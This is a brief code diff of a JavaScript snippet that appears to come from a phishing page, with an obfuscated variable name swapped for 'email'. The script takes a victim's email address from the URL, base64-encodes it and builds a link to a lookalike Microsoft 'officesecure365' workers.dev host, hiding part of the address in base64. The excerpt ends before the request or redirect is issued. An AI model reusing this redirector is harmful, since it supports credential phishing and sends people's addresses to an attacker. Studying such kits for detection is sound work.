@@ -1,11 +1,11 @@
 <script type="text/javascript">
     var urlParams = new URLSearchParams(window.location.search);
-    var dSBoYXZlIHRvIGRlYWwgd2l0aCBCYXNlNjQgZm9ybWF0PyBUaGVuIHRoaXMgc2l0ZSBpcyBwZXJmZWN0IGZvciB5b3UhI = urlParams.get('dSBoYXZlIHRvIGRlYWwgd2l0aCBCYXNlNjQgZm9ybWF0PyBUaGVuIHRoaXMgc2l0ZSBpcyBwZXJmZWN0IGZvciB5b3UhI');
+    var email = urlParams.get('email');
 
-    if (dSBoYXZlIHRvIGRlYWwgd2l0aCBCYXNlNjQgZm9ybWF0PyBUaGVuIHRoaXMgc2l0ZSBpcyBwZXJmZWN0IGZvciB5b3UhI) {
+    if (email) {
         const encdStr = 'LndvcmtlcnMuZGV2Lw==';
         const str = atob(encdStr);
-        const encodedEmail = btoa(dSBoYXZlIHRvIGRlYWwgd2l0aCBCYXNlNjQgZm9ybWF0PyBUaGVuIHRoaXMgc2l0ZSBpcyBwZXJmZWN0IGZvciB5b3UhI);
+        const encodedEmail = btoa(email);
         const emma = '?&qrc=' + encodedEmail;
         const dr = 'https://e320539b.officesecure365';
         const ax = dr + str;
